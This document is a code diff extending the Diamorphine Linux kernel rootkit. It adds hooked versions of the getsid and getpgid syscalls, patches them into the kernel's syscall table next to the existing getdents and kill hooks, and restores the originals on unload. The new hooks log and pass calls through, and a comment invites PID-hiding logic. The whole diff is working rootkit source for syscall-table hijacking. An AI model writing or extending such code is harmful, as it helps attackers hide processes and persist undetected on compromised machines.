@@ -29,6 +29,14 @@
 #define __NR_getdents 141
 #endif
 
+#ifndef __NR_getsid
+#define __NR_getsid 124
+#endif
+
+#ifndef __NR_getpgid
+#define __NR_getpgid 121
+#endif
+
 #include "diamorphine.h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
@@ -51,6 +59,13 @@ static unsigned long *__sys_call_table;
 	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
 		struct linux_dirent64 *, unsigned int);
 	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+
+	typedef asmlinkage int (*orig_getsid_t)(pid_t pid);
+	typedef asmlinkage int (*orig_getpgid_t)(pid_t pid);
+
+	static orig_getsid_t orig_getsid;
+	static orig_getpgid_t orig_getpgid;
+
 	orig_getdents_t orig_getdents;
 	orig_getdents64_t orig_getdents64;
 	orig_kill_t orig_kill;
@@ -60,6 +75,8 @@ unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
+
+	printk("ROOTKITS: get_syscall_table_bf\n");
 	
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
 #ifdef KPROBE_LOOKUP
@@ -109,6 +126,20 @@ is_invisible(pid_t pid)
 		return 1;
 	return 0;
 }
+
+asmlinkage int hacked_getsid(pid_t pid) {
+    // If you want to hide certain PIDs, add logic here.
+    // For now, just pass through.
+	printk("ROOTKITS: hacked_getsid\n");
+    return orig_getsid(pid);
+}
+
+asmlinkage int hacked_getpgid(pid_t pid) {
+    // Similar logic as getsid.
+	printk("ROOTKITS: hacked_getpgid\n");
+    return orig_getpgid(pid);
+}
+
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
@@ -408,11 +439,16 @@ diamorphine_init(void)
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 #endif
 
+	orig_getsid = (orig_getsid_t)__sys_call_table[__NR_getsid];
+	orig_getpgid = (orig_getpgid_t)__sys_call_table[__NR_getpgid];
+
 	unprotect_memory();
 
 	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+	__sys_call_table[__NR_getsid] = (unsigned long)hacked_getsid;
+	__sys_call_table[__NR_getpgid] = (unsigned long)hacked_getpgid;
 
 	protect_memory();
 
@@ -427,6 +463,8 @@ diamorphine_cleanup(void)
 	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+	__sys_call_table[__NR_getsid] = (unsigned long)orig_getsid;
+	__sys_call_table[__NR_getpgid] = (unsigned long)orig_getpgid;
 
 	protect_memory();
 }
